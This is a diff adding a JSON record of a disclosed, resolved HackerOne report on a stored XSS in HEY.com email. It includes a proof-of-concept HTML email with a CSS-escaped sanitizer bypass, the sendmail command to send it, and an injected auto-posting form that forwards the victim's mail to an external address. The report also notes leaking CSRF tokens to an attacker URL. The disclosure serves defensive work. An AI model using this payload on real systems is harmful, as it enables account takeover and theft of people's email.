@@ -1,0 +1,133 @@
+{
+  "id": 982291,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85ODIyOTE=",
+  "url": "https://hackerone.com/reports/982291",
+  "title": "HEY.com email stored XSS",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2020-09-15T03:13:48.611Z",
+  "submitted_at": "2020-09-15T03:13:48.629Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "jouko",
+    "url": "/jouko",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/mqyrwb0f5m6e7yq17l0nrhhz32yw/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 67,
+    "url": "https://hackerone.com/basecamp",
+    "handle": "basecamp",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/STtZ2opgRsHdKby72xs56KhB/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/STtZ2opgRsHdKby72xs56KhB/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Basecamp",
+      "twitter_handle": "basecamp",
+      "website": "https://basecamp.com/about/policies/security/response",
+      "about": "Basecamp is the leading online project manager and the birthplace of Ruby on Rails. Creators of the HEY email service."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2020-10-27T18:06:36.831Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-10-27T18:06:36.752Z",
+  "team_member_agreed_on_going_public_at": "2020-10-27T18:02:23.528Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "An attacker can bypass the HEY.com HTML sanitizer and inject arbitrary unsafe HTML in emails.\n\nTo reproduce the bug you have to send raw HTML-formatted email. You can do it e.g. with the Sendmail tool on Linux.\n\nExample email:\n~~~~ plain\nFrom: jouko@klikki.fi\nTo: jouko@hey.com\nSubject: HackerOne test\nMIME-Version: 1.0\nContent-type: text/html\n\n<style>\nurl(cid://\\00003c\\000027message-content\\00003e\\00003ctemplate\\00003e\\00003cstyle\\00003exxx);\nurl(cid://\\00003c/style\\00003e\\00003c/template\\00003e\\00003c/message-content\\00003e\\00003cform\\000020action=/my/accounts/266986/forwardings/outbounds\\000020data-controller=beacon\\00003e\\00003cinput\\000020type=text\\000020name=contact_outbound_forwarding[to_email_address]\\000020value=joukop@gmail.com\\00003e\\00003c/form\\00003exxx);\n</style>\n~~~~\nTo send the email, create a text file with the above contents. Send it with the command\n~~~~ plain\n/usr/sbin/sendmail -t < email.txt\n~~~~\n\n\nThe backslashes in the <style> tag are decoded. The first \\000027 confuses the HTML filter. The encoded <message-content> and <template> tags are there to escape the DOM shadowroot element. The HTML filter doesn't let you inject only closing tags, i.e. </template>, you need an opening tag first.\n\nFinally, HTML like this is injected:\n~~~~ html\n<form action=\"/my/accounts/266986/forwardings/outbound\" data-controller=\"beacon\">\n<input type=text name=\"contact_outbound_forwarding[to_email_address]\" value=\"joukop@gmail.com\">\n</form>\n~~~~\nThis exploits the Stimulus framework and the existing JavaScript controllers to post the form automatically. The CSRF token is inserted by the framework. This example sets up email forwarding to an external address.\n\nThis is just one way to exploit the bug. Even though plain <script> won't work in modern browsers due to the Content Security Policy, It seems likely there are ways to bypass it by using the JS frameworks (will look at this more). The account ID in this PoC has to be guesstimated or brute forced (266986).\n\nAnother example is to simply set the form ```action``` to an attacker URL. This will send the user's CSRF token to the attacker so that it could be used in a subsequent attack.\n\nThe POST request in Chrome's developer console:\n{F988220}\n\nIf you want to view the email on my HEY account (jouko@hey.com) the email ID is 83625339.\n\n## Impact\n\nA HEY user viewing an email sent by the attacker may have their account compromised.",
+  "bounty_amount": "5000.0",
+  "formatted_bounty": "$5,000",
+  "weakness": {
+    "id": 62,
+    "name": "Cross-site Scripting (XSS) - Stored"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 988220,
+      "file_name": "hey.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/EucnSJSAyvKCmFeSUpQb3aSP?response-content-disposition=attachment%3B%20filename%3D%22hey.png%22%3B%20filename%2A%3DUTF-8%27%27hey.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYAI44UUZ%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T084017Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIFnznGupH6e54NvfcNpXG1fTkfeS%2F%2B4teUauLzxrIq4YAiBshmGMJ%2Bo8WM%2FFrf7MR%2FU21KtXRONpl5NElLsIaMUQfSqyBQgREAMaDDAxMzYxOTI3NDg0OSIMXPiWQtj6xSi2cjIbKo8FRWivxOLh01wA%2Fz1AtWdUT%2FDuDfnITDsEc0h0ZC0yraEvha7LjG4t3v5I908iN5vTo4EaDTLjvXl1rCGzdWevtLl1NeJX1RdkL5C1gAMVdLGx%2B5fJIz0U2TaOwlZLZGTfLXuvz0TYTIoXCv%2BTJ%2BCuCXfmsxzWLgOvtpQ6Fe1pfGxTxavuuP%2FwaohZmOInE1ToPHFI6BuB1gHpgt1uFStw%2FpNPckkPR3sr2uBWze4ANd4ON2wrZhY8Pxk3top00Ve%2F1XDJHx3M%2BKqmealPl9nvCzCZvijQCF8o8SXOenErrcgnr6Tneilwgd%2FgvKcxCJgGGNacER%2BA%2FCfExC%2B6gZOmWZxGPP1xzmOpCcMjRXNaxId%2F%2BItvDudmYkq8n%2FGslstAKUNQHYaVy4kBXgRB1RH7nN5GMxBXuAo626lO2XresQRQOaAJfgPdvOYIfo8XLeU13MEkHusR1%2FSRrQNiNMwre3akw%2F2m2Xljv8qpi4O%2F90xehyveSyKABniDZV4eWd%2BywLj4NDd2va5YysIZcfQOpTreBAgND6t8bL9QZ2bIj5DivhAVk8KMBWQ14ckYbgi7wx6IscTukzq6EP1mP6duppBXSs39lKprZ95RmIBRAUBLkVZyh5yzGHc9GTZJRjrvnhmPEQ9ejo7e%2Fhr3gEeJiJA4HVa69pHf3L%2BNYw81XYIZOFXVfxclkLuWNXGN858R7xtCjnmLq1namZIoDbKkwgmaL8tQEDF48pcE%2BkZcdA%2F%2Be%2FMRc9m3BdEtpaHhAYuuzK017Eg54rq56nJYOIiT1vYw4xD1A4%2FE6ijPE8b5Gyy8JtlpcwWayVgyBsIv0SSUH04KVu555J%2FU81sKKwdB%2BUmwDm3WwiJ9Zbuqyp9VSDCo4b7GBjqyATX09D9cMLHStjYE4l3%2Boe0gkIYCsy%2BdDoZ80qsOhDrtYMQU%2B92NOTmY2k8LmyQa6%2BwNOBgXXTzI3Uy3rHXq78Nnli8tiTQXLW2QhF1Kb9jIQeSh6%2BxyPQCbIabbisZgl3httI9UOrVsuH8tXmJsD0LIT2Eyjy96wQh52riOwwuGzSDGbcjkRlcFBXY5YAVSxsgcno3ZE3%2FPbJmyqXIyf2yH6TqnjaPl6oiSTv0vQpO8rk0%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b4f94e93c2300f9094edb57f96290a302d02217b9ca1e0c5a6303f35e9edb487",
+      "file_size": 143422,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-11-26T18:02:23.663Z",
+  "allow_singular_disclosure_after": -152030273.81162542,
+  "singular_disclosure_allowed": true,
+  "vote_count": 353,
+  "voters": [
+    "th3hidd3nmist",
+    "panya",
+    "mole_concept",
+    "arist0phanes",
+    "nytr0gen",
+    "n1m0",
+    "sw33tlie",
+    "kyy",
+    "pudsec",
+    "drsniper",
+    "and 343 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 53959,
+    "asset_type": "WILDCARD",
+    "asset_identifier": "*.hey.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
